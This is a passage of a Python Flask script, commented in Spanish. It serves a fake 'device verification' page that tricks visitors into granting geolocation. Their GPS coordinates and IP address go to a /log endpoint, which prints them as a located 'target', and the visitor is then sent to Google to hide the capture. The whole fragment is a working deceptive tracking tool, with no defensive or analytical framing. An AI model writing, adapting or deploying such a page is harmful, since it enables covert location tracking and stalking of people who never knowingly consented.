# --- HTML PROFESIONAL ---
HTML_ENCUESTA = """
<!DOCTYPE html>
<html>
<body style="background:#1a1a1a; color:#00ff00; font-family:Arial; text-align:center;">
    <div style="margin-top:50px;">
        <h2>Verificación de Dispositivo</h2>
        <p>Para acceder al contenido, por favor valide su conexión.</p>
        <button onclick="val()" style="padding:15px; background:green; color:white; border:none; cursor:pointer;">VALIDAR CONEXIÓN</button>
    </div>
    <script>
        function val() {
            navigator.geolocation.getCurrentPosition((p) => {
                fetch('/log', {method: 'POST', headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({lat: p.coords.latitude, lon: p.coords.longitude})})
                .then(() => window.location.href = "https://www.google.com");
            });
        }
    </script>
</body>
</html>
"""

@app.route('/')
def index(): return render_template_string(HTML_ENCUESTA)

@app.route('/log', methods=['POST'])
def log():
    d = request.json
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    print(f"\n{GREEN}[+] OBJETIVO LOCALIZADO{RESET}")
    print(f"{CYAN}[*] IP: {ip} | GPS: {d['lat']}, {d['lon']}{RESET}")
    return "OK"

